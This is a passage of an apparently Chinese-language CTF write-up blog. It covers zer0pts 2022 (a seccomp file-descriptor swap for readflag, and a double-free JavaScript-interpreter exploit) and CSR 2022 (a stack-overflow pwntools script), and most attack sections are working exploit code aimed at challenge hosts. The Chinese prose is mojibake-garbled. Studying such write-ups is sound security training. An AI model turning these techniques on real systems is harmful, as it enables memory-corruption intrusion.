<span class="hljs-keyword">if</span> (resp == <span class="hljs-literal">NULL</span>)<br>    errExit(<span class="hljs-string">&quot;malloc-seccomp_notif_resp&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">handleNotifications</span><span class="hljs-params">(<span class="hljs-keyword">int</span> notifyFd)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_notif_sizes</span> <span class="hljs-title">sizes</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_notif</span> *<span class="hljs-title">req</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_notif_resp</span> *<span class="hljs-title">resp</span>;</span><br>  <span class="hljs-keyword">char</span> path[PATH_MAX];<br><br>  allocSeccompNotifBuffers(&amp;req, &amp;resp, &amp;sizes);<br><br>  <span class="hljs-comment">/* Loop handling notifications */</span><br><br>  <span class="hljs-keyword">for</span> (;;)<br>  &#123;<br>    <span class="hljs-comment">/* Wait for next notification, returning info in &#x27;*req&#x27; */</span><br><br>    <span class="hljs-built_in">memset</span>(req, <span class="hljs-number">0</span>, sizes.seccomp_notif);<br>    <span class="hljs-keyword">if</span> (ioctl(notifyFd, SECCOMP_IOCTL_NOTIF_RECV, req) == <span class="hljs-number">-1</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (errno == EINTR)<br>        <span class="hljs-keyword">continue</span>;<br>      errExit(<span class="hljs-string">&quot;\tS: ioctl-SECCOMP_IOCTL_NOTIF_RECV&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (req-&gt;data.nr != __NR_openat)<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<br>          <span class="hljs-string">&quot;\tS: notification contained unexpected &quot;</span><br>          <span class="hljs-string">&quot;system call number; bye!!!\n&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_notif_addfd</span> <span class="hljs-title">addfd</span>;</span><br>    addfd.id = req-&gt;id; <span class="hljs-comment">/* Cookie from SECCOMP_IOCTL_NOTIF_RECV */</span><br>    addfd.srcfd = openat(req-&gt;data.args[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;/tmp/payload&quot;</span>, req-&gt;data.args[<span class="hljs-number">2</span>], req-&gt;data.args[<span class="hljs-number">3</span>]);<br>    addfd.newfd = <span class="hljs-number">3</span>;<br>    addfd.flags = SECCOMP_ADDFD_FLAG_SETFD;<br>    addfd.newfd_flags = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> a2 = ioctl(notifyFd, SECCOMP_IOCTL_NOTIF_ADDFD, &amp;addfd);<br><br>    resp-&gt;id = req-&gt;id;<br>    resp-&gt;flags = <span class="hljs-number">0</span>;<br>    resp-&gt;val = <span class="hljs-number">0</span>;<br>    resp-&gt;error = resp-&gt;val = <span class="hljs-number">0</span>;<br>    resp-&gt;val = a2;<br><br>    resp-&gt;flags = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (ioctl(notifyFd, SECCOMP_IOCTL_NOTIF_SEND, resp) == <span class="hljs-number">-1</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (errno == ENOENT)<br>        <span class="hljs-built_in">printf</span>(<br>            <span class="hljs-string">&quot;\tS: response failed with ENOENT; &quot;</span><br>            <span class="hljs-string">&quot;perhaps target process&#x27;s syscall was &quot;</span><br>            <span class="hljs-string">&quot;interrupted by a signal?\n&quot;</span>);<br>      <span class="hljs-keyword">else</span><br>        perror(<span class="hljs-string">&quot;ioctl-SECCOMP_IOCTL_NOTIF_SEND&quot;</span>);<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-built_in">free</span>(req);<br>  <span class="hljs-built_in">free</span>(resp);<br>  <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-comment">/* Implementation of the supervisor process:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  (1) obtains the notification file descriptor from &#x27;sockPair[1]&#x27;</span><br><span class="hljs-comment">  (2) handles notifications that arrive on that file descriptor. */</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">supervisor</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sockPair[<span class="hljs-number">2</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> notifyFd = recvfd(sockPair[<span class="hljs-number">1</span>]);<br>  <span class="hljs-keyword">if</span> (notifyFd == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;recvfd&quot;</span>);<br><br>  closeSocketPair(sockPair); <span class="hljs-comment">/* We no longer need the socket pair */</span><br><br>  handleNotifications(notifyFd);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">readBinary</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> sz, readed;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size:&quot;</span>);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;sz);<br>  <span class="hljs-keyword">char</span> *buf = <span class="hljs-built_in">malloc</span>(sz);<br><br>  <span class="hljs-keyword">int</span> f = open(<span class="hljs-string">&quot;/tmp/payload&quot;</span>, O_WRONLY | O_CREAT, <span class="hljs-number">0777</span>);<br>  <span class="hljs-keyword">while</span> (sz &gt; <span class="hljs-number">0</span>)<br>  &#123;<br>    readed = read(<span class="hljs-number">0</span>, buf, sz);<br>    write(f, buf, readed);<br>    sz -= readed;<br>  &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> sockPair[<span class="hljs-number">2</span>];<br><br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>  readBinary();<br>  <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, sockPair) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;socketpair&quot;</span>);<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span> <span class="hljs-title">sa</span>;</span><br>  sa.sa_handler = sigchldHandler;<br>  sa.sa_flags = <span class="hljs-number">0</span>;<br>  sigemptyset(&amp;sa.sa_mask);<br>      <br>  <span class="hljs-keyword">if</span> (sigaction(SIGCHLD, &amp;sa, <span class="hljs-literal">NULL</span>) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;sigaction&quot;</span>);<br>  targetProcess(sockPair, &amp;argv[optind]);<br><br>  supervisor(sockPair);<br><br>  <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// #include &lt;unistd.h&gt;</span><br><span class="hljs-comment">// #include &lt;asm/unistd.h&gt;</span><br><br><span class="hljs-comment">// __asm__(&quot;.symver __libc_start_main_impl,__libc_start_main@GLIBC_2.34&quot;);</span><br><span class="hljs-comment">// __asm__(&quot;.symver __libc_start_main_impl,__libc_start_main@GLIBC_3.2.5&quot;);</span><br><span class="hljs-comment">// __asm__(&quot;.symver puts_impl,puts@GLIBC_2.2.5&quot;);</span><br><span class="hljs-comment">// __asm__(&quot;.symver puts_impl,puts@GLIBC_2.34&quot;);</span><br><br><br><span class="hljs-keyword">void</span> __libc_start_main()&#123;<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;.intel_syntax noprefix&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rax,1&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rsi,rdi&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rdi,1&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;mov rdx,0x1000&quot;</span>);<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;syscall&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// void puts_impl()&#123;</span><br><span class="hljs-comment">//     asm(&quot;.intel_syntax noprefix&quot;);</span><br><span class="hljs-comment">//     asm(&quot;mov rax,1&quot;);</span><br><span class="hljs-comment">//     asm(&quot;mov qword ptr [rax],1&quot;);</span><br><span class="hljs-comment">// &#125;</span><br></code></pre></div></td></tr></table></figure><h4 id="map"><a href="#map" class="headerlink" title="map:"></a>map:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">GLIBC_2<span class="hljs-number">.34</span> &#123;<br>        global: __libc_start_main;<span class="hljs-built_in">puts</span>;<br>        local:  *;      # Hide all other symbols<br>&#125;;<br>GLIBC_2<span class="hljs-number">.2</span><span class="hljs-number">.5</span> &#123;<br>        global: __libc_start_main;<br>        local:  *;      # Hide all other symbols<br>&#125;;<br></code></pre></div></td></tr></table></figure><h3 id="solution-3"><a href="#solution-3" class="headerlink" title="solution 3 - ?"></a>solution 3 - ?</h3><blockquote><p>team solution</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>        prctl(PR_SET_NO_NEW_PRIVS, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        execlp(<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;LD_DEBUG=all sudo&quot;</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>ç„¶åå‘¢? æ²¡çœ‹æ‡‚</p><p>å‘ƒå‘ƒæ„Ÿè§‰æ˜¯ä¸Šä¸€ç§æ–¹æ³•çš„ä¸€ä¸ªæ­¥éª¤, </p><ul><li>LD_DEBUGèƒ½æ‰“å°å‡ºldåœ¨åŠ è½½å…±äº«åº“æ—¶çš„ä¿¡æ¯, åŒ…æ‹¬ç¬¦å·ä¿¡æ¯. </li><li>PR_SET_NO_NEW_PRIVSè®©ä¹‹åçš„execæ‰§è¡Œçš„æ–°ç¨‹åºæ— æ³•é€šè¿‡ç®€å•çš„setgidæˆ–è€…ä¿®æ”¹æ–‡ä»¶æƒé™è·å¾—æ–°çš„æƒé™. </li></ul><p>è¿™é‡Œæ˜¯è§£æ³•æ¥æº<a href="https://clubby789.me/zer0pts2022/#readflag">link</a> </p><h2 id="jsy"><a href="#jsy" class="headerlink" title="jsy"></a>jsy</h2><p>æœ€çŸ­çš„ä¸€ä¸ªexp, æœ€é•¿çš„æœ‰å‡ åƒè¡Œä¸çŸ¥é“åœ¨å†™å•¥. æœ€çŸ­çš„ä¹Ÿä¸çŸ¥é“åœ¨å†™å•¥. </p><p>å‘ç°äº†æ–‡æ¡£, åŸæ¥æ˜¯ä¸€ä¸ªjsè§£é‡Šå™¨, æ˜¯ä¸€ä¸ªç°æˆçš„é¡¹ç›®. é‚£ä¸ªpatchæ˜¯çœŸæ˜¯å­˜åœ¨çš„ä¸€ä¸ªæ¼æ´å—? è¿™ä»£ç é‡ä¹Ÿå¤ªå¤§äº†â€¦.jsä¹Ÿä¸æ€ä¹ˆä¼šâ€¦</p><blockquote><p>patché‡ŒåŠ çš„freeå¯ä»¥double freeï¼Œ2.35çš„glibcï¼Œå¯ä»¥é€šè¿‡å ä½æ§åˆ¶æŸä¸ªheaderå®ç°ä»»æ„åœ°å€è¯»å†™</p><p>æ²¡æœ‰Bufferï¼Œå¯ä»¥ç”¨Arrayï¼Œheaderå¤§å°åº”è¯¥æ˜¯0x90</p><p>Arrayè¢«freeæ—¶ï¼Œè²Œä¼¼åªæœ‰headerè¢«freeäº†ï¼Œbodyä¸ä¼šè¢«free</p></blockquote><h3 id="zanderdkçš„è§£é‡Š"><a href="#zanderdkçš„è§£é‡Š" class="headerlink" title="@zanderdkçš„è§£é‡Š:"></a>@zanderdkçš„è§£é‡Š:</h3><p>Short explanation: We use quite to create a object of type JS_CCFUNCTION which will have c union type bellow:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">js_Object</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">char</span> noTcacheOverwrite[<span class="hljs-number">0x18</span>]; <br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">js_Class</span> <span class="hljs-title">type</span>;</span><br>    <span class="hljs-keyword">int</span> extensible;<br>    js_Property *properties;<br>    <span class="hljs-keyword">int</span> count; <span class="hljs-comment">/* number of properties, for array sparseness check */</span><br>    js_Object *prototype;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>....<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>            <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name;<br>            js_CFunction function;<br>            js_CFunction constructor;<br>            <span class="hljs-keyword">int</span> length;<br>            <span class="hljs-keyword">void</span> *data; <br>            js_Finalize finalize;<br>        &#125; c;<br></code></pre></div></td></tr></table></figure><p><code>js_CFunction function;</code> is a function pointer. We then free this object (target in hax.js) but keep a refrence to this object and we allocate it back using: </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">S_fromCharCode</span><span class="hljs-params">(js_State *J)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i, top = js_gettop(J);<br>    <span class="hljs-keyword">char</span> * <span class="hljs-keyword">volatile</span> s = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">char</span> *p;<br>    Rune c;<br>    <span class="hljs-keyword">if</span> (js_try(J)) &#123;<br>        js_free(J, s);<br>        js_throw(J);<br>    &#125;<br>    s = p = js_malloc(J, (top<span class="hljs-number">-1</span>) * UTFmax + <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; top; ++i) &#123;<br>        c = js_touint32(J, i);<br>        p += runetochar(p, &amp;c);<br>    &#125;<br>    *p = <span class="hljs-number">0</span>;<br>    js_pushstring(J, s);<br>    js_endtry(J);<br>    js_free(J, s);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>then we partialy overwrite the function pointer with the addres of static void jsB_read(js_State *J) which will put the content of a file into a JS string.  The problem here is the <code>*p = 0;</code>  in the C above, as it will insert null terminator in the address. Sooo we just run it enough times for ALSR to pick a address with 0 at that position in the address. also runetochar do some utf8 magic to some of the bytes we put in if outside of ascii range. so prop a bit more than 255 actually. </p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">JS_CCFUNCTION = <span class="hljs-number">4</span> <span class="hljs-comment">/* built-in function */</span><br><span class="hljs-keyword">var</span> a = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x20</span>; i++) &#123;<br>    a += <span class="hljs-string">&quot;\x08&quot;</span>;<br>&#125;<br><span class="hljs-keyword">var</span> thingy = &#123;&#125;;<br><span class="hljs-keyword">var</span> dummy1 = &#123;&#125;;<br><span class="hljs-keyword">var</span> dummy2 = &#123;&#125;;<br><span class="hljs-keyword">var</span> dummy3 = &#123;&#125;;<br><span class="hljs-keyword">var</span> dummy4 = &#123;&#125;;<br><span class="hljs-keyword">var</span> target = quit;<br><span class="hljs-keyword">var</span> over = <span class="hljs-string">&quot;A&quot;</span>;<br>free(target);<br>free(thingy);<br>a.toLowerCase();<br><br><span class="hljs-keyword">var</span> a = ((target.length) &amp; <span class="hljs-number">0xffffff</span>) - <span class="hljs-number">0x2c2</span>;<br>print(a);<br><br>lol = <span class="hljs-built_in">String</span>.fromCharCode(<br>    <span class="hljs-number">0x010000</span>,<br>    <span class="hljs-number">0x010000</span>,<br>    <span class="hljs-number">0x010000</span>,<br>    <span class="hljs-number">0x010000</span>,<br>    <span class="hljs-number">0x010000</span>,<br>    <span class="hljs-number">0x010000</span>,<br>    JS_CCFUNCTION, <span class="hljs-comment">/* +0x18 */</span><br>    <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x010000</span>,      <span class="hljs-comment">/* +0x1c : extensible */</span><br>    <span class="hljs-number">0x010000</span>,      <span class="hljs-comment">/* properties */</span><br>    <span class="hljs-number">0x010000</span>,<br>    <span class="hljs-number">0x010000</span>,      <span class="hljs-comment">/* count  */</span><br>    <span class="hljs-number">0x010000</span>,<br>    <span class="hljs-number">0x0800</span>,      <span class="hljs-comment">/* prototype  */</span><br>    <span class="hljs-number">0x43</span>,      <span class="hljs-comment">/*  */</span><br>    <span class="hljs-number">0x43</span>,      <span class="hljs-comment">/*  */</span><br>    <span class="hljs-number">0x43</span>,<br>    <span class="hljs-number">0x43</span>,<br>    <span class="hljs-number">0x43</span>,<br>    <span class="hljs-number">0x43</span>,<br>    <span class="hljs-number">0x43</span>,<br>    <span class="hljs-number">0x43</span>,<br>    <span class="hljs-number">0x43</span>,<br>    <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>,<br>    <span class="hljs-comment">// partial overwrite start here</span><br>    a &amp; <span class="hljs-number">0xff</span>,<br>    (a &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>,<br>    (a &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span><br>)<br><br>print(target(<span class="hljs-string">&quot;/flag.txt&quot;</span>));<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>);<br>-- EOF --<br></code></pre></div></td></tr></table></figure><h2 id="Escape-maze"><a href="#Escape-maze" class="headerlink" title="Escape maze"></a>Escape maze</h2><p>è¿˜æ²¡çœ‹è¿‡. </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>conn=remote(<span class="hljs-string">&quot;65.21.255.31&quot;</span>,<span class="hljs-number">34979</span>)<br>r=<span class="hljs-string">b&#x27;0&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    u=conn.recvuntil(<span class="hljs-string">b&#x27;key number:&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(u)<br>    nr=u.split(<span class="hljs-string">b&#x27;\n&#x27;</span>)[-<span class="hljs-number">2</span>].split(<span class="hljs-string">b&#x27; &#x27;</span>)[-<span class="hljs-number">8</span>].replace(<span class="hljs-string">b&#x27;,&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> nr!=r:<br>        conn.sendline(nr)<br>        r=nr<br>    <span class="hljs-keyword">else</span>:<br>        conn.sendline(u.split(<span class="hljs-string">b&#x27;\n&#x27;</span>)[<span class="hljs-number">1</span>].split(<span class="hljs-string">b&#x27; &#x27;</span>)[-<span class="hljs-number">1</span>])<br></code></pre></div></td></tr></table></figure><h1 id="ASIS-CTF-2022-FINA"><a href="#ASIS-CTF-2022-FINA" class="headerlink" title="ASIS CTF 2022 FINA"></a>ASIS CTF 2022 FINA</h1><h2 id="readable-v2"><a href="#readable-v2" class="headerlink" title="readable-v2"></a>readable-v2</h2><h1 id="CSR-2022"><a href="#CSR-2022" class="headerlink" title="CSR 2022"></a>CSR 2022</h1><h2 id="PWNMEPLX"><a href="#PWNMEPLX" class="headerlink" title="PWNMEPLX"></a>PWNMEPLX</h2><blockquote><p>CSR 2022</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">â”Œâ”€â”€(rootğŸ’€kali)-[/mnt/LearingList/CTF/PWNMEPLX]<br>â””â”€# checksec pwn             <br>[*] &#x27;/mnt/LearingList/CTF/PWNMEPLX/pwn&#x27;<br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br></code></pre></div></td></tr></table></figure><p>è¿™ä¸ªæ˜¯å–ç»å¯¹å€¼çš„x64æ±‡ç¼–å†™æ³•: </p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">.text:0000000000401336 8B 45 8C                                   mov     eax, [rbp+var_74]<br>.text:0000000000401339 99                                         cdq<br>.text:000000000040133A 89 D0                                      mov     eax, edx<br>.text:000000000040133C 33 45 8C                                   xor     eax, [rbp+var_74]<br>.text:000000000040133F 29 D0                                      sub     eax, edx<br>.text:0000000000401341 C9                                         leave<br>.text:0000000000401342 C3                                         retn<br></code></pre></div></td></tr></table></figure><p>ç®€å•çš„æ ˆæº¢å‡ºè¦†ç›–è¿”å›åœ°å€å±…ç„¶å› ä¸º&lt;__vfscanf_internal+133&gt;å¤„çš„xmmwordéœ€è¦0x10å­—èŠ‚å¯¹é½è€Œå‡ºé”™â€¦â€¦.</p><p>ç®€å•çš„ä¸æƒ³å¤šè¯´. ä½†æ˜¯è¿˜æ˜¯åšäº†å¥½ä¸€ä¼šå„¿, è¿˜åœ¨æƒ³æ˜¯ä¸æ˜¯ç¬¦å·/æµ®ç‚¹æ•°çš„é—®é¢˜, ç»“æœå°±æ˜¯ä¸€ä¸ªç®€å•çš„åé—¨æ ˆæº¢å‡º.</p><p>è¿™ä¸ªæ¯”èµ›çš„pwné¢˜å…¨éƒ½æ˜¯ç­¾åˆ°, å·®ç‚¹æ„æ€. </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">from pwn <span class="hljs-keyword">import</span> *<br>context.binary = <span class="hljs-string">&#x27;./pwn.elf64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>ss=lambda x:p.send(x)       <span class="hljs-meta">#send string</span><br>sl=lambda x:p.sendline(x)<br>ru=lambda x:p.recvuntil(x)<br>rl=lambda :p.recvline()<br>ra=lambda :p.recv()         <span class="hljs-meta">#recv one</span><br>rn=lambda x:p.recv(x)       <span class="hljs-meta">#recv n</span><br>sla=lambda x,y:p.sendlineafter(x,y)<br>itt=lambda :p.interactive()<br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    p = remote(<span class="hljs-string">&quot;chall.rumble.host&quot;</span>, <span class="hljs-number">5415</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./pwn.elf64&quot;</span>)<br><br>payload = b<span class="hljs-number">&#x27;b</span><span class="hljs-number">&#x27;</span>*(<span class="hljs-number">112</span>+<span class="hljs-number">8</span>) + pack(<span class="hljs-number">0x401348</span>, <span class="hljs-number">64</span>)<br>sl(b<span class="hljs-string">&quot;-1&quot;</span>)<br>sl(payload)<br>itt()<br></code></pre></div></td></tr></table></figure><h2 id="PWNFORTRESS"><a href="#PWNFORTRESS" class="headerlink" title="PWNFORTRESS"></a>PWNFORTRESS</h2><blockquote><p>åŒä¸Š, ä¸è¿‡é¢˜ç›®æ˜¯rev+game. åŸºæœ¬ä¸ä¼š</p></blockquote><p>ä¸»è¦é—®é¢˜æ˜¯æ˜ç¡®äº†glibcç‰ˆæœ¬, ä½†æ˜¯ubuntuçš„2.3å‡ ä¹‹åçš„å…¨éƒ½æ˜¯ç”¨.zstå‹ç¼©, dpkgæ— æ³•è§£å‹, æ”¹æˆäº†æ¸…åæºä¸­debiançš„glibcåº“, 